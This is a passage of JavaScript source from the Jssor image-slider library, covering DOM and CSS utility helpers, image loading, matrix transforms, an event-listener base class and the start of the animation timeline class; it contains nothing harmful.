        for (var i = 1; i < arguments.length; i++) {

            var options = arguments[i];

            // Only deal with non-null/undefined values
            if (options) {
                // Extend the base object
                for (var name in options) {
                    target[name] = options[name];
                }
            }
        }

        // Return the modified object
        return target;
    }

    _This.$Extend = Extend;

    function Unextend(target, options) {
        $JssorDebug$.$Assert(options);

        var unextended = {};

        // Extend the base object
        for (var name in target) {
            if (target[name] != options[name]) {
                unextended[name] = target[name];
            }
        }

        // Return the modified object
        return unextended;
    }

    _This.$Unextend = Unextend;

    _This.$IsUndefined = function (obj) {
        return type(obj) == "undefined";
    };

    _This.$IsFunction = function (obj) {
        return type(obj) == "function";
    };

    _This.$IsArray = function (obj) {
        return type(obj) == "array";
    };

    _This.$IsString = function (obj) {
        return type(obj) == "string";
    };

    _This.$IsNumeric = function (obj) {
        return !isNaN(ParseFloat(obj)) && isFinite(obj);
    };

    _This.$IsWindow = function (obj) {
        return obj && obj == obj.window;
    };

    _This.$Type = type;

    // args is for internal usage only
    _This.$Each = each;

    _This.$IsPlainObject = isPlainObject;

    function CreateElement(tagName) {
        return document.createElement(tagName);
    }

    _This.$CreateElement = CreateElement;

    _This.$CreateDiv = function () {
        return CreateElement("DIV", document);
    };

    _This.$CreateSpan = function () {
        return CreateElement("SPAN", document);
    };

    _This.$EmptyFunction = function () { };

    function Attribute(elmt, name, value) {
        if (value == undefined)
            return elmt.getAttribute(name);

        elmt.setAttribute(name, value);
    }

    function AttributeEx(elmt, name) {
        return Attribute(elmt, name) || Attribute(elmt, "data-" + name);
    }

    _This.$Attribute = Attribute;
    _This.$AttributeEx = AttributeEx;

    function ClassName(elmt, className) {
        if (className == undefined)
            return elmt.className;

        elmt.className = className;
    }

    _This.$ClassName = ClassName;

    function ToHash(array) {
        var hash = {};

        each(array, function (item) {
            hash[item] = item;
        });

        return hash;
    }

    _This.$ToHash = ToHash;

    function Join(separator, strings) {
        ///	<param name="separator" type="String">
        ///		The element to show the dialog around
        ///	</param>
        ///	<param name="strings" type="Array" value="['1']">
        ///		The element to show the dialog around
        ///	</param>

        var joined = "";

        each(strings, function (str) {
            joined && (joined += separator);
            joined += str;
        });

        return joined;
    }

    _This.$Join = Join;

    _This.$AddClass = function (elmt, className) {
        var newClassName = ClassName(elmt) + " " + className;
        ClassName(elmt, Join(" ", ToHash(newClassName.match(REGEX_WHITESPACE_GLOBAL))));
    };

    _This.$RemoveClass = function (elmt, className) {
        ClassName(elmt, Join(" ", _This.$Unextend(ToHash(ClassName(elmt).match(REGEX_WHITESPACE_GLOBAL)), ToHash(className.match(REGEX_WHITESPACE_GLOBAL)))));
    };

    _This.$ParentNode = function (elmt) {
        return elmt.parentNode;
    };

    _This.$HideElement = function (elmt) {
        _This.$CssDisplay(elmt, "none");
    };

    _This.$EnableElement = function (elmt, notEnable) {
        if (notEnable) {
            _This.$Attribute(elmt, "disabled", true);
        }
        else {
            _This.$RemoveAttribute(elmt, "disabled");
        }
    };

    _This.$HideElements = function (elmts) {
        for (var i = 0; i < elmts.length; i++) {
            _This.$HideElement(elmts[i]);
        }
    };

    _This.$ShowElement = function (elmt, hide) {
        _This.$CssDisplay(elmt, hide ? "none" : "");
    };

    _This.$ShowElements = function (elmts, hide) {
        for (var i = 0; i < elmts.length; i++) {
            _This.$ShowElement(elmts[i], hide);
        }
    };

    _This.$RemoveAttribute = function (elmt, attrbuteName) {
        elmt.removeAttribute(attrbuteName);
    };

    _This.$CanClearClip = function () {
        return IsBrowserIE() && browserRuntimeVersion < 10;
    };

    _This.$SetStyleClip = function (elmt, clip) {
        if (clip) {
            elmt.style.clip = "rect(" + Math.round(clip.$Top) + "px " + Math.round(clip.$Right) + "px " + Math.round(clip.$Bottom) + "px " + Math.round(clip.$Left) + "px)";
        }
        else {
            var cssText = elmt.style.cssText;
            var clipRegs = [
                new RegExp(/[\s]*clip: rect\(.*?\)[;]?/i),
                new RegExp(/[\s]*cliptop: .*?[;]?/i),
                new RegExp(/[\s]*clipright: .*?[;]?/i),
                new RegExp(/[\s]*clipbottom: .*?[;]?/i),
                new RegExp(/[\s]*clipleft: .*?[;]?/i)
            ];

            var newCssText = BuildNewCss(cssText, clipRegs, "");

            $Jssor$.$CssCssText(elmt, newCssText);
        }
    };

    _This.$GetNow = function () {
        return new Date().getTime();
    };

    _This.$AppendChild = function (elmt, child) {
        elmt.appendChild(child);
    };

    _This.$AppendChildren = function (elmt, children) {
        each(children, function (child) {
            _This.$AppendChild(elmt, child);
        });
    };

    _This.$InsertBefore = function (elmt, child, refObject) {
        elmt.insertBefore(child, refObject);
    };

    _This.$InsertAdjacentHtml = function (elmt, where, text) {
        elmt.insertAdjacentHTML(where, text);
    };

    _This.$RemoveChild = function (elmt, child) {
        elmt.removeChild(child);
    };

    _This.$RemoveChildren = function (elmt, children) {
        each(children, function (child) {
            _This.$RemoveChild(elmt, child);
        });
    };

    _This.$ClearChildren = function (elmt) {
        _This.$RemoveChildren(elmt, _This.$Children(elmt));
    };

    _This.$ParseInt = function (str, radix) {
        return parseInt(str, radix || 10);
    };

    function ParseFloat(str) {
        return parseFloat(str);
    }

    _This.$ParseFloat = ParseFloat;

    _This.$IsChild = function (elmtA, elmtB) {
        var body = document.body;
        while (elmtB && elmtA != elmtB && body != elmtB) {
            try {
                elmtB = elmtB.parentNode;
            } catch (e) {
                // Firefox sometimes fires events for XUL elements, which throws
                // a "permission denied" error. so this is not a child.
                return false;
            }
        }
        return elmtA == elmtB;
    };

    function CloneNode(elmt, noDeep) {
        return elmt.cloneNode(!noDeep);
    }

    _This.$CloneNode = CloneNode;

    function TranslateTransition(transition) {
        if (transition) {
            var flyDirection = transition.$FlyDirection;

            if (flyDirection & 1) {
                transition.x = transition.$ScaleHorizontal || 1;
            }
            if (flyDirection & 2) {
                transition.x = -transition.$ScaleHorizontal || -1;
            }
            if (flyDirection & 4) {
                transition.y = transition.$ScaleVertical || 1;
            }
            if (flyDirection & 8) {
                transition.y = -transition.$ScaleVertical || -1;
            }

            if (transition.$Rotate == true)
                transition.$Rotate = 1;

            TranslateTransition(transition.$Brother);
        }
    }

    _This.$TranslateTransitions = function (transitions) {
        ///	<summary>
        ///		For backward compatibility only.
        ///	</summary>
        if (transitions) {
            for (var i = 0; i < transitions.length; i++) {
                TranslateTransition(transitions[i]);
            }
            for (var name in transitions) {
                TranslateTransition(transitions[name]);
            }
        }
    };

    //function ImageLoader() {
    //    var _ThisImageLoader = this;
    //    var _BaseImageLoader = _This.$Inherit(_ThisImageLoader, $JssorObject$);

    //    var _ImageLoading = 1;
    //    var _MainImageSrc;
    //    var _MainImage;
    //    var _CompleteCallback;
    //    var _MainImageAbort;

    //    function LoadCompleteCallback(image, abort) {
    //        _ImageLoading--;

    //        if (image) {
    //            _This.$RemoveEvent(image, "load");
    //            _This.$RemoveEvent(image, "abort");
    //            _This.$RemoveEvent(image, "error");

    //            if (_MainImageSrc == image.src) {
    //                _MainImage = image;
    //                _MainImageAbort = abort;
    //            }
    //        }

    //        _CompleteCallback && _CompleteCallback(_MainImage, _MainImageAbort);
    //    }

    //    function LoadImage(src) {
    //        _ImageLoading++;

    //        if (IsBrowserOpera() && browserRuntimeVersion < 11.6 || !src) {
    //            LoadImageCallback(callback, null, !src);
    //        }
    //        else {
    //            var image = new Image();

    //            _This.$AddEvent(image, "load", _This.$CreateCallback(null, LoadImageCallback, image, false));

    //            var abortHandler = _This.$CreateCallback(null, LoadImageCallback, image, true);
    //            _This.$AddEvent(image, "abort", abortHandler);
    //            _This.$AddEvent(image, "error", abortHandler);

    //            image.src = src;
    //        }
    //    }

    //    _ThisImageLoader.$LoadImage = function (src, callback) {
    //        _MainImageSrc = src;
    //        _CompleteCallback = callback;

    //        LoadImage(src);
    //        LoadComplete();
    //    };

    //    _ThisImageLoader.$LoadImages = function (imageElmts, mainImageElmt, callback) {
    //        mainImageElmt && (_MainImageSrc = mainImageElmt.src);
    //        _CompleteCallback = callback;

    //        each(imageElmts, function (imageElmt) {
    //            LoadImage(imageElmt.src);
    //        });
    //        LoadComplete();
    //    };
    //}

    _This.$LoadImage = function (src, callback) {
        var image = new Image();

        function LoadImageCompleteHandler(abort) {
            _This.$RemoveEvent(image, "load", LoadImageCompleteHandler);
            _This.$RemoveEvent(image, "abort", ErrorOrAbortHandler);
            _This.$RemoveEvent(image, "error", ErrorOrAbortHandler);

            if (callback)
                callback(image, abort);
        }

        function ErrorOrAbortHandler() {
            LoadImageCompleteHandler(true);
        }

        if (IsBrowserOpera() && browserRuntimeVersion < 11.6 || !src) {
            LoadImageCompleteHandler(!src);
        }
        else {

            _This.$AddEvent(image, "load", LoadImageCompleteHandler);
            _This.$AddEvent(image, "abort", ErrorOrAbortHandler);
            _This.$AddEvent(image, "error", ErrorOrAbortHandler);
            
            image.src = src;
        }
    };

    _This.$LoadImages = function (imageElmts, mainImageElmt, callback) {

        var _ImageLoading = imageElmts.length + 1;

        function LoadImageCompleteEventHandler(image, abort) {
            _ImageLoading--;
            if (mainImageElmt && image && image.src == mainImageElmt.src)
                mainImageElmt = image;
            !_ImageLoading && callback && callback(mainImageElmt);
        }

        each(imageElmts, function (imageElmt) {
            _This.$LoadImage(imageElmt.src, LoadImageCompleteEventHandler);
        });

        LoadImageCompleteEventHandler();
    };

    _This.$BuildElement = function (template, tagName, replacer, createCopy) {
        if (createCopy)
            template = CloneNode(template);

        var templateHolders = FindChildren(template, tagName);
        if (!templateHolders.length)
            templateHolders = $Jssor$.$GetElementsByTag(template, tagName);

        for (var j = templateHolders.length -1; j > -1; j--) {
            var templateHolder = templateHolders[j];
            var replaceItem = CloneNode(replacer);
            ClassName(replaceItem, ClassName(templateHolder));
            $Jssor$.$CssCssText(replaceItem, templateHolder.style.cssText);

            var thumbnailPlaceHolderParent = $Jssor$.$ParentNode(templateHolder);
            $Jssor$.$InsertBefore(thumbnailPlaceHolderParent, replaceItem, templateHolder);
            $Jssor$.$RemoveChild(thumbnailPlaceHolderParent, templateHolder);
        }

        return template;
    };

    var _MouseDownButtons;
    function JssorButtonEx(elmt) {
        var _Self = this;

        var _OriginClassName;

        var _IsMouseDown;   //class name 'dn'
        var _IsActive;      //class name 'av'
        var _IsDisabled;    //class name 'ds'

        function Highlight() {
            var className = _OriginClassName;

            if (_IsDisabled) {
                className += 'ds';
            }
            else if (_IsMouseDown) {
                className += 'dn';
            }
            else if (_IsActive) {
                className += "av";
            }

            ClassName(elmt, className);
        }

        function OnMouseDown(event) {
            if (_IsDisabled) {
                _This.$CancelEvent(event);
            }
            else {
                _MouseDownButtons.push(_Self);

                _IsMouseDown = true;

                Highlight();
            }
        }

        _Self.$MouseUp = function () {
            ///	<summary>
            ///		Internal member function, do not use it.
            ///	</summary>
            ///	<private />

            _IsMouseDown = false;

            Highlight();
        };

        _Self.$Activate = function (activate) {
            if (activate != undefined) {
                _IsActive = activate;

                Highlight();
            }
            else {
                return _IsActive;
            }
        };

        _Self.$Enable = function (enable) {
            if (enable != undefined) {
                _IsDisabled = !enable;

                Highlight();
            }
            else {
                return !_IsDisabled;
            }
        };

        //JssorButtonEx Constructor
        {
            elmt = _This.$GetElement(elmt);

            if (!_MouseDownButtons) {
                _This.$AddEventBrowserMouseUp(function () {
                    var oldMouseDownButtons = _MouseDownButtons;
                    _MouseDownButtons = [];

                    each(oldMouseDownButtons, function (button) {
                        button.$MouseUp();
                    });
                });

                _MouseDownButtons = [];
            }

            _OriginClassName = ClassName(elmt);

            $Jssor$.$AddEvent(elmt, "mousedown", OnMouseDown);
        }
    }

    _This.$Buttonize = function (elmt) {
        return new JssorButtonEx(elmt);
    };

    _This.$Css = Css;
    _This.$CssN = CssN;
    _This.$CssP = CssP;

    _This.$CssOverflow = CssProxy("overflow");

    _This.$CssTop = CssProxy("top", 2);
    _This.$CssLeft = CssProxy("left", 2);
    _This.$CssWidth = CssProxy("width", 2);
    _This.$CssHeight = CssProxy("height", 2);
    _This.$CssMarginLeft = CssProxy("marginLeft", 2);
    _This.$CssMarginTop = CssProxy("marginTop", 2);
    _This.$CssPosition = CssProxy("position");
    _This.$CssDisplay = CssProxy("display");
    _This.$CssZIndex = CssProxy("zIndex", 1);
    _This.$CssFloat = function (elmt, float) {
        return Css(elmt, IsBrowserIE() ? "styleFloat" : "cssFloat", float);
    };
    _This.$CssOpacity = function (elmt, opacity, ie9EarlierForce) {
        if (opacity != undefined) {
            SetStyleOpacity(elmt, opacity, ie9EarlierForce);
        }
        else {
            return GetStyleOpacity(elmt);
        }
    };

    _This.$CssCssText = function (elmt, text) {
        if (text != undefined) {
            elmt.style.cssText = text;
        }
        else {
            return elmt.style.cssText;
        }
    };

    var _StyleGetter = {
        $Opacity: _This.$CssOpacity,
        $Top: _This.$CssTop,
        $Left: _This.$CssLeft,
        $Width: _This.$CssWidth,
        $Height: _This.$CssHeight,
        $Position: _This.$CssPosition,
        $Display: _This.$CssDisplay,
        $ZIndex: _This.$CssZIndex
    };

    var _StyleSetterReserved;

    function StyleSetter() {
        if (!_StyleSetterReserved) {
            _StyleSetterReserved = Extend({
                $MarginTop: _This.$CssMarginTop,
                $MarginLeft: _This.$CssMarginLeft,
                $Clip: _This.$SetStyleClip,
                $Transform: _This.$SetStyleTransform
            }, _StyleGetter);
        }
        return _StyleSetterReserved;
    }

    function StyleSetterEx() {
        StyleSetter();

        //For Compression Only
        _StyleSetterReserved.$Transform = _StyleSetterReserved.$Transform;

        return _StyleSetterReserved;
    }

    _This.$StyleSetter = StyleSetter;

    _This.$StyleSetterEx = StyleSetterEx;

    _This.$GetStyles = function (elmt, originStyles) {
        StyleSetter();

        var styles = {};

        each(originStyles, function (value, key) {
            if (_StyleGetter[key]) {
                styles[key] = _StyleGetter[key](elmt);
            }
        });

        return styles;
    };

    _This.$SetStyles = function (elmt, styles) {
        var styleSetter = StyleSetter();

        each(styles, function (value, key) {
            styleSetter[key] && styleSetter[key](elmt, value);
        });
    };

    _This.$SetStylesEx = function (elmt, styles) {
        StyleSetterEx();

        _This.$SetStyles(elmt, styles);
    };

    $JssorMatrix$ = new function () {
        var _ThisMatrix = this;

        function Multiply(ma, mb) {
            var acs = ma[0].length;
            var rows = ma.length;
            var cols = mb[0].length;

            var matrix = [];

            for (var r = 0; r < rows; r++) {
                var row = matrix[r] = [];
                for (var c = 0; c < cols; c++) {
                    var unitValue = 0;

                    for (var ac = 0; ac < acs; ac++) {
                        unitValue += ma[r][ac] * mb[ac][c];
                    }

                    row[c] = unitValue;
                }
            }

            return matrix;
        }

        _ThisMatrix.$ScaleX = function (matrix, sx) {
            return _ThisMatrix.$ScaleXY(matrix, sx, 0);
        };

        _ThisMatrix.$ScaleY = function (matrix, sy) {
            return _ThisMatrix.$ScaleXY(matrix, 0, sy);
        };

        _ThisMatrix.$ScaleXY = function (matrix, sx, sy) {
            return Multiply(matrix, [[sx, 0], [0, sy]]);
        };

        _ThisMatrix.$TransformPoint = function (matrix, p) {
            var pMatrix = Multiply(matrix, [[p.x], [p.y]]);

            return Point(pMatrix[0][0], pMatrix[1][0]);
        };
    };

    _This.$CreateMatrix = function (alpha, scaleX, scaleY) {
        var cos = Math.cos(alpha);
        var sin = Math.sin(alpha);
        //var r11 = cos;
        //var r21 = sin;
        //var r12 = -sin;
        //var r22 = cos;

        //var m11 = cos * scaleX;
        //var m12 = -sin * scaleY;
        //var m21 = sin * scaleX;
        //var m22 = cos * scaleY;

        return [[cos * scaleX, -sin * scaleY], [sin * scaleX, cos * scaleY]];
    };

    _This.$GetMatrixOffset = function (matrix, width, height) {
        var p1 = $JssorMatrix$.$TransformPoint(matrix, Point(-width / 2, -height / 2));
        var p2 = $JssorMatrix$.$TransformPoint(matrix, Point(width / 2, -height / 2));
        var p3 = $JssorMatrix$.$TransformPoint(matrix, Point(width / 2, height / 2));
        var p4 = $JssorMatrix$.$TransformPoint(matrix, Point(-width / 2, height / 2));

        return Point(Math.min(p1.x, p2.x, p3.x, p4.x) + width / 2, Math.min(p1.y, p2.y, p3.y, p4.y) + height / 2);
    };

    _This.$Transform = function (fromStyles, toStyles, interPosition, easings, durings, rounds, options) {

        var currentStyles = toStyles;

        if (fromStyles) {
            currentStyles = {};

            for (var key in toStyles) {
                var round = rounds[key] || 1;
                var during = durings[key] || [0, 1];
                var propertyInterPosition = (interPosition - during[0]) / during[1];
                propertyInterPosition = Math.min(Math.max(propertyInterPosition, 0), 1);
                propertyInterPosition = propertyInterPosition * round;
                var floorPosition = Math.floor(propertyInterPosition);
                if (propertyInterPosition != floorPosition)
                    propertyInterPosition -= floorPosition;

                var easing = easings[key] || easings.$Default;
                var easingValue = easing(propertyInterPosition);
                var currentPropertyValue;
                var value = fromStyles[key];
                var toValue = toStyles[key];

                if ($Jssor$.$IsNumeric(toValue)) {
                    currentPropertyValue = value + (toValue - value) * easingValue;
                }
                else {
                    currentPropertyValue = $Jssor$.$Extend({ $Offset: {} }, fromStyles[key]);

                    $Jssor$.$Each(toValue.$Offset, function (rectX, n) {
                        var offsetValue = rectX * easingValue;
                        currentPropertyValue.$Offset[n] = offsetValue;
                        currentPropertyValue[n] += offsetValue;
                    });
                }
                currentStyles[key] = currentPropertyValue;
            }

            if (fromStyles.$Zoom) {
                currentStyles.$Transform = { $Rotate: currentStyles.$Rotate || 0, $Scale: currentStyles.$Zoom, $OriginalWidth: options.$OriginalWidth, $OriginalHeight: options.$OriginalHeight };
            }
        }

        if (toStyles.$Clip && options.$Move) {
            var styleFrameNClipOffset = currentStyles.$Clip.$Offset;

            var offsetY = (styleFrameNClipOffset.$Top || 0) + (styleFrameNClipOffset.$Bottom || 0);
            var offsetX = (styleFrameNClipOffset.$Left || 0) + (styleFrameNClipOffset.$Right || 0);

            currentStyles.$Left = (currentStyles.$Left || 0) + offsetX;
            currentStyles.$Top = (currentStyles.$Top || 0) + offsetY;
            currentStyles.$Clip.$Left -= offsetX;
            currentStyles.$Clip.$Right -= offsetX;
            currentStyles.$Clip.$Top -= offsetY;
            currentStyles.$Clip.$Bottom -= offsetY;
        }

        if (currentStyles.$Clip && $Jssor$.$CanClearClip() && !currentStyles.$Clip.$Top && !currentStyles.$Clip.$Left && (currentStyles.$Clip.$Right == options.$OriginalWidth) && (currentStyles.$Clip.$Bottom == options.$OriginalHeight))
            currentStyles.$Clip = null;

        return currentStyles;
    };
};

//$JssorObject$
var $JssorObject$ = window.$JssorObject$ = function () {
    var _ThisObject = this;
    // Fields

    var _Listeners = []; // dictionary of eventName --> array of handlers
    var _Listenees = [];

    // Private Methods
    function AddListener(eventName, handler) {

        $JssorDebug$.$Execute(function () {
            if (eventName == undefined || eventName == null)
                throw new Error("param 'eventName' is null or empty.");

            if (typeof (handler) != "function") {
                throw "param 'handler' must be a function.";
            }

            $Jssor$.$Each(_Listeners, function (listener) {
                if (listener.$EventName == eventName && listener.$Handler === handler) {
                    throw new Error("The handler listened to the event already, cannot listen to the same event of the same object with the same handler twice.");
                }
            });
        });

        _Listeners.push({ $EventName: eventName, $Handler: handler });
    }

    function RemoveListener(eventName, handler) {

        $JssorDebug$.$Execute(function () {
            if (eventName == undefined || eventName == null)
                throw new Error("param 'eventName' is null or empty.");

            if (typeof (handler) != "function") {
                throw "param 'handler' must be a function.";
            }
        });

        $Jssor$.$Each(_Listeners, function (listener, index) {
            if (listener.$EventName == eventName && listener.$Handler === handler) {
                _Listeners.splice(index, 1);
            }
        });
    }

    function ClearListeners() {
        _Listeners = [];
    }

    function ClearListenees() {

        $Jssor$.$Each(_Listenees, function (listenee) {
            $Jssor$.$RemoveEvent(listenee.$Obj, listenee.$EventName, listenee.$Handler);
        });

        _Listenees = [];
    }

    //Protected Methods
    _ThisObject.$Listen = function (obj, eventName, handler, useCapture) {

        $JssorDebug$.$Execute(function () {
            if (!obj)
                throw new Error("param 'obj' is null or empty.");

            if (eventName == undefined || eventName == null)
                throw new Error("param 'eventName' is null or empty.");

            if (typeof (handler) != "function") {
                throw "param 'handler' must be a function.";
            }

            $Jssor$.$Each(_Listenees, function (listenee) {
                if (listenee.$Obj === obj && listenee.$EventName == eventName && listenee.$Handler === handler) {
                    throw new Error("The handler listened to the event already, cannot listen to the same event of the same object with the same handler twice.");
                }
            });
        });

        $Jssor$.$AddEvent(obj, eventName, handler, useCapture);
        _Listenees.push({ $Obj: obj, $EventName: eventName, $Handler: handler });
    };

    _ThisObject.$Unlisten = function (obj, eventName, handler) {

        $JssorDebug$.$Execute(function () {
            if (!obj)
                throw new Error("param 'obj' is null or empty.");

            if (eventName == undefined || eventName == null)
                throw new Error("param 'eventName' is null or empty.");

            if (typeof (handler) != "function") {
                throw "param 'handler' must be a function.";
            }
        });

        $Jssor$.$Each(_Listenees, function (listenee, index) {
            if (listenee.$Obj === obj && listenee.$EventName == eventName && listenee.$Handler === handler) {
                $Jssor$.$RemoveEvent(obj, eventName, handler);
                _Listenees.splice(index, 1);
            }
        });
    };

    _ThisObject.$UnlistenAll = ClearListenees;

    // Public Methods
    _ThisObject.$On = _ThisObject.addEventListener = AddListener;

    _ThisObject.$Off = _ThisObject.removeEventListener = RemoveListener;

    _ThisObject.$TriggerEvent = function (eventName) {

        var args = [].slice.call(arguments, 1);

        $Jssor$.$Each(_Listeners, function (listener) {
            try {
                listener.$EventName == eventName && listener.$Handler.apply(window, args);
            } catch (e) {
                // handler threw an error, ignore, go on to next one
                $JssorDebug$.$Error(e.name + " while executing " + eventName +
                        " handler: " + e.message, e);
            }
        });
    };

    _ThisObject.$Destroy = function () {
        ClearListenees();
        ClearListeners();

        for (var name in _ThisObject)
            delete _ThisObject[name];
    };

    $JssorDebug$.$C_AbstractClass(_ThisObject);
};

$JssorAnimator$ = function (delay, duration, options, elmt, fromStyles, toStyles) {
    delay = delay || 0;

    var _ThisAnimator = this;
    var _AutoPlay;
    var _Hiden;
    var _CombineMode;
    var _PlayToPosition;
    var _PlayDirection;
    var _NoStop;
    var _TimeStampLastFrame = 0;

    var _SubEasings;
    var _SubRounds;
    var _SubDurings;
    var _Callback;

    var _Position_Current = 0;
    var _Position_Display = 0;
    var _Hooked;

    var _Position_InnerBegin = delay;
    var _Position_InnerEnd = delay + duration;
    var _Position_OuterBegin;
    var _Position_OuterEnd;
    var _LoopLength;

    var _NestedAnimators = [];
    var _StyleSetter;

    function GetPositionRange(position, begin, end) {
        var range = 0;

        if (position < begin)
            range = -1;

        else if (position > end)
            range = 1;

        return range;
    }

    function GetInnerPositionRange(position) {
        return GetPositionRange(position, _Position_InnerBegin, _Position_InnerEnd);
    }

    function GetOuterPositionRange(position) {
        return GetPositionRange(position, _Position_OuterBegin, _Position_OuterEnd);
    }

    function Shift(offset) {
        _Position_OuterBegin += offset;
        _Position_OuterEnd += offset;
        _Position_InnerBegin += offset;
        _Position_InnerEnd += offset;

        _Position_Current += offset;
        _Position_Display += offset;

        $Jssor$.$Each(_NestedAnimators, function (animator) {
            animator, animator.$Shift(offset);
        });
    }

    function Locate(position, relative) {
        var offset = position - _Position_OuterBegin + delay * relative;

        Shift(offset);

        //$JssorDebug$.$Execute(function () {
        //    _ThisAnimator.$Position_InnerBegin = _Position_InnerBegin;
        //    _ThisAnimator.$Position_InnerEnd = _Position_InnerEnd;
        //    _ThisAnimator.$Position_OuterBegin = _Position_OuterBegin;
        //    _ThisAnimator.$Position_OuterEnd = _Position_OuterEnd;
        //});

        return _Position_OuterEnd;
    }

    function GoToPosition(positionOuter, force) {
        var trimedPositionOuter = positionOuter;

        if (_LoopLength && (trimedPositionOuter >= _Position_OuterEnd || trimedPositionOuter <= _Position_OuterBegin)) {
            trimedPositionOuter = ((trimedPositionOuter - _Position_OuterBegin) % _LoopLength + _LoopLength) % _LoopLength + _Position_OuterBegin;
        }

        if (!_Hooked || _NoStop || force || _Position_Current != trimedPositionOuter) {

            var positionToDisplay = Math.min(trimedPositionOuter, _Position_OuterEnd);
            positionToDisplay = Math.max(positionToDisplay, _Position_OuterBegin);

            if (!_Hooked || _NoStop || force || positionToDisplay != _Position_Display) {
                if (toStyles) {

                    var interPosition = (positionToDisplay - _Position_InnerBegin) / (duration || 1);

                    //if (options.$Optimize && $Jssor$.$IsBrowserChrome() && duration) {
                    //    interPosition = Math.round(interPosition / 8 * duration) * 8 / duration;
                    //}

                    if (options.$Reverse)
                        interPosition = 1 - interPosition;

                    var currentStyles = $Jssor$.$Transform(fromStyles, toStyles, interPosition, _SubEasings, _SubDurings, _SubRounds, options);

                    $Jssor$.$Each(currentStyles, function (value, key) {
                        _StyleSetter[key] && _StyleSetter[key](elmt, value);
                    });
                }

                _ThisAnimator.$OnInnerOffsetChange(_Position_Display - _Position_InnerBegin, positionToDisplay - _Position_InnerBegin);
            }

            _Position_Display = positionToDisplay;

            $Jssor$.$Each(_NestedAnimators, function (animator, i) {
                var nestedAnimator = positionOuter < _Position_Current ? _NestedAnimators[_NestedAnimators.length - i - 1] : animator;
                nestedAnimator.$GoToPosition(positionOuter, force);
            });

            var positionOld = _Position_Current;
            var positionNew = positionOuter;

            _Position_Current = trimedPositionOuter;
            _Hooked = true;

            _ThisAnimator.$OnPositionChange(positionOld, positionNew);
        }
    }

    function Join(animator, combineMode) {
        ///	<summary>
        ///		Combine another animator as nested animator
        ///	</summary>
        ///	<param name="animator" type="$JssorAnimator$">
        ///		An instance of $JssorAnimator$
        ///	</param>
        ///	<param name="combineMode" type="int">
        ///		0: parallel - place the animator parallel to this animator.
        ///		1: chain - chain the animator at the _Position_InnerEnd of this animator.
        ///	</param>
        $JssorDebug$.$Execute(function () {
            if (combineMode !== 0 && combineMode !== 1)
                $JssorDebug$.$Fail("Argument out of range, the value of 'combineMode' should be either 0 or 1.");
        });

        if (combineMode)
            animator.$Locate(_Position_OuterEnd, 1);

        _Position_OuterEnd = Math.max(_Position_OuterEnd, animator.$GetPosition_OuterEnd());
        _NestedAnimators.push(animator);
    }

    var RequestAnimationFrame = window.requestAnimationFrame
    || window.webkitRequestAnimationFrame
    || window.mozRequestAnimationFrame
    || window.msRequestAnimationFrame;

    if ($Jssor$.$IsBrowserSafari() && $Jssor$.$BrowserVersion() < 7) {
        RequestAnimationFrame = null;

        $JssorDebug$.$Log("Custom animation frame for safari before 7.");
    }

    RequestAnimationFrame = RequestAnimationFrame || function (callback) {
        $Jssor$.$Delay(callback, options.$Interval);
    };

    function ShowFrame() {
        if (_AutoPlay) {
            var now = $Jssor$.$GetNow();
            var timeOffset = Math.min(now - _TimeStampLastFrame, options.$IntervalMax);
            var timePosition = _Position_Current + timeOffset * _PlayDirection;
            _TimeStampLastFrame = now;

            if (timePosition * _PlayDirection >= _PlayToPosition * _PlayDirection)
                timePosition = _PlayToPosition;

            GoToPosition(timePosition);

            if (!_NoStop && timePosition * _PlayDirection >= _PlayToPosition * _PlayDirection) {
                Stop(_Callback);
            }
            else {
                RequestAnimationFrame(ShowFrame);
            }
        }
    }

    function PlayToPosition(toPosition, callback, noStop) {
        if (!_AutoPlay) {
            _AutoPlay = true;
            _NoStop = noStop
            _Callback = callback;
            toPosition = Math.max(toPosition, _Position_OuterBegin);
            toPosition = Math.min(toPosition, _Position_OuterEnd);
            _PlayToPosition = toPosition;
            _PlayDirection = _PlayToPosition < _Position_Current ? -1 : 1;
            _ThisAnimator.$OnStart();
            _TimeStampLastFrame = $Jssor$.$GetNow();
            RequestAnimationFrame(ShowFrame);
        }
    }

    function Stop(callback) {
        if (_AutoPlay) {
            _NoStop = _AutoPlay = _Callback = false;
            _ThisAnimator.$OnStop();

            if (callback)
                callback();
        }
    }

    _ThisAnimator.$Play = function (positionLength, callback, noStop) {
        PlayToPosition(positionLength ? _Position_Current + positionLength : _Position_OuterEnd, callback, noStop);
    };

    _ThisAnimator.$PlayToPosition = PlayToPosition;

    _ThisAnimator.$PlayToBegin = function (callback, noStop) {
        PlayToPosition(_Position_OuterBegin, callback, noStop);
    };

    _ThisAnimator.$PlayToEnd = function (callback, noStop) {
        PlayToPosition(_Position_OuterEnd, callback, noStop);
    };

    _ThisAnimator.$Stop = Stop;

    _ThisAnimator.$Continue = function (toPosition) {
        PlayToPosition(toPosition);
    };

    _ThisAnimator.$GetPosition = function () {
        return _Position_Current;
    };

    _ThisAnimator.$GetPlayToPosition = function () {
        return _PlayToPosition;
    };

    _ThisAnimator.$GetPosition_Display = function () {
        return _Position_Display;
    };

    _ThisAnimator.$GoToPosition = GoToPosition;

    _ThisAnimator.$GoToBegin = function () {
        GoToPosition(_Position_OuterBegin, true);
    };

    _ThisAnimator.$GoToEnd = function () {
        GoToPosition(_Position_OuterEnd, true);
    };

    _ThisAnimator.$Move = function (offset) {
        GoToPosition(_Position_Current + offset);
    };

    _ThisAnimator.$CombineMode = function () {
        return _CombineMode;
    };

    _ThisAnimator.$GetDuration = function () {
        return duration;
    };

    _ThisAnimator.$IsPlaying = function () {
        return _AutoPlay;
    };

    _ThisAnimator.$IsOnTheWay = function () {
        return _Position_Current > _Position_InnerBegin && _Position_Current <= _Position_InnerEnd;
    };

    _ThisAnimator.$SetLoopLength = function (length) {
        _LoopLength = length;
    };

    _ThisAnimator.$Locate = Locate;

    _ThisAnimator.$Shift = Shift;

    _ThisAnimator.$Join = Join;

    _ThisAnimator.$Combine = function (animator) {
        ///	<summary>
        ///		Combine another animator parallel to this animator
        ///	</summary>
        ///	<param name="animator" type="$JssorAnimator$">
        ///		An instance of $JssorAnimator$
        ///	</param>
        Join(animator, 0);
    };

    _ThisAnimator.$Chain = function (animator) {
        ///	<summary>
        ///		Chain another animator at the _Position_InnerEnd of this animator
        ///	</summary>
        ///	<param name="animator" type="$JssorAnimator$">
        ///		An instance of $JssorAnimator$
        ///	</param>
        Join(animator, 1);
    };

    _ThisAnimator.$GetPosition_InnerBegin = function () {
        ///	<summary>
        ///		Internal member function, do not use it.
        ///	</summary>
        ///	<private />
        ///	<returns type="int" />
